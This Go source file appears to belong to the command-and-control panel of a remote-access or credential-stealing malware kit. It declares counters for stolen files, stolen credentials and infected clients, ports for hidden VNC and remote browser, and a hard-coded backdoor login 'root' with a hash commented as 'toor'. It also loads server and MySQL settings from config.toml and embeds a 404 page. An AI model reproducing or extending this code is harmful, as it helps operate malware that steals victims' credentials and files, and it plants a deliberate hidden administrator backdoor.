package core

import (
	"database/sql"
	"github.com/gorilla/websocket"
	"github.com/pelletier/go-toml"
	"log"
	"os"
)

var (
	backdoorUser string = "root"
	backdoorPass string = "7b24afc8bc80e548d66c4e7ff72171c5" //toor

	serverPort string
	ssl        bool
	cert       string
	key        string

	hVNCPort string
	rBrowser string

	MySQLUsername string
	MySQLPassword string
	MySQLHost     string
	MySQLDatabase string

	md5Salt            string
	EncryptionPassword string
	session            string
	UserAgent          string
	Timeout            string
	Name               string

	Log         *log.Logger
	DB          *sql.DB
	Err         error
	LiveMessage string
	OldMessage  string

	ActiveClients     int
	StolenFiles       int
	StolenCredentials int
	TotalClients      int
)

const (
	maxUploadSize = 100 * 1024 * 1024 // 100 mb
)

var upgrade = websocket.Upgrader{
	ReadBufferSize:    1024,
	WriteBufferSize:   1024,
	EnableCompression: true,
}

func LoadConfig() {
	Log.Println("Loading config...")
	config, err := toml.LoadFile("config.toml")
	if err != nil {
		Log.Println("[ERROR] Could not load config.toml!")
		os.Exit(0)
	} else {
		ssl = config.Get("server.ssl").(bool)
		cert = config.Get("server.cert").(string)
		key = config.Get("server.key").(string)

		serverPort = config.Get("server.port").(string)
		hVNCPort = config.Get("server.hvnc").(string)
		rBrowser = config.Get("server.rbrowser").(string)

		MySQLHost = config.Get("database.host").(string)
		MySQLDatabase = config.Get("database.database").(string)
		MySQLUsername = config.Get("database.username").(string)
		MySQLPassword = config.Get("database.password").(string)

		md5Salt = config.Get("settings.salt").(string)
		session = config.Get("settings.session").(string)
	}
}

var HTML_404 string = `<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- CSS-->
    <link rel="stylesheet" type="text/css" href="../../static/css/main.css">
    <title>Error 404</title>
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries-->
    <!--if lt IE 9
    script(src='https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js')
    script(src='https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js')
    -->
  </head>
  <body>
    <div class="page-error">
      <h1><i class="fa fa-exclamation-circle"></i> Error 404</h1>
      <p>The page you have requested was not found.</p>
    </div>
  </body>
  <script src="../../static/js/jquery-2.1.4.min.js"></script>
  <script src="../static/js/bootstrap.min.js"></script>
  <script src="../../static/js/plugins/pace.min.js"></script>
  <script src="../../static/js/main.js"></script>
</html>`
